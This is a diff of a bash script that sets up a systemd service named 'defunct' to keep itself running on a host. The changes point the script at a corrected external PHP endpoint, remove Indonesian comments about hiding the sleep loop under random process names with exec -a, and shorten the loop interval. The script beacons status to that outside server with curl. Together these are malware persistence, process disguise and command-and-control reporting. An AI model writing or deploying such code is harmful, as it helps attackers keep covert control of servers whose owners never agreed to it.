@@ -3,7 +3,7 @@
 
 self_healing_script_path="/usr/local/bin/self"
 service_file_path="/etc/systemd/system/self.service"
-php_endpoint="https://zer09day.id/love.php"  
+php_endpoint="https://zer0day.id/love.php"  
 service_name="defunct"
 pid_file="/var/run/self.pid"
 
@@ -56,10 +56,10 @@ write_pid
 
 while true; do
     if systemctl is-active --quiet "$service_name"; then
-        # Memilih nama proses secara acak untuk sleep
+        
         RANDOM_SLEEP_NAME="\$(choose_random_proc_name)"
-        # Menjalankan sleep dengan nama proses tersembunyi
-        exec -a "\$RANDOM_SLEEP_NAME" sleep 10  # Menggunakan exec -a untuk mengubah nama sleep
+        
+        exec -a "\$RANDOM_SLEEP_NAME" sleep 3  
     else
         curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
         
